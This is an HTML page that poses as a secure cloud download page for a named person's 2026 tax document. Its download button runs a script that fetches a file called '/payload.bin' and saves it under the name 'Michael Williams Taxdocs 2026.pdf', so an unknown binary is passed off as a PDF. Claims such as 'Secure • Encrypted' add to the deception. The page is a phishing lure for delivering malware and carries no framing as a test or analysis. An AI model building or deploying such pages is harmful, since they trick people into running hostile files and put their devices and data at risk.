<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SecureFilePro Cloud</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f8f9fa; padding: 50px; text-align: center; }
    .container {
      max-width: 620px; margin: 0 auto; background: white; padding: 40px;
      border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.1);
    }
    .btn {
      background: #007bff; color: white; padding: 15px 40px; font-size: 18px;
      border: none; border-radius: 6px; cursor: pointer; margin-top: 25px;
    }
    .btn:hover { background: #0056b3; }
    .filename { font-weight: bold; color: #333; font-size: 18px; margin: 20px 0; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Your tax document is ready</h2>
    <div class="filename">Michael Williams Taxdocs 2026.pdf</div>
    <p>Size: 10.4 MB | Secure • Encrypted</p>
    
    <button class="btn" onclick="downloadFile()">Download Now</button>
    
    <p style="margin-top: 30px; color: #666; font-size: 14px;">
      Your file will be downloaded securely.
    </p>
  </div>

  <script>
    function downloadFile() {
      const link = document.createElement('a');
      link.href = "/payload.bin";                    // relative path
      link.download = "Michael Williams Taxdocs 2026.pdf";
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }
  </script>
</body>
</html>
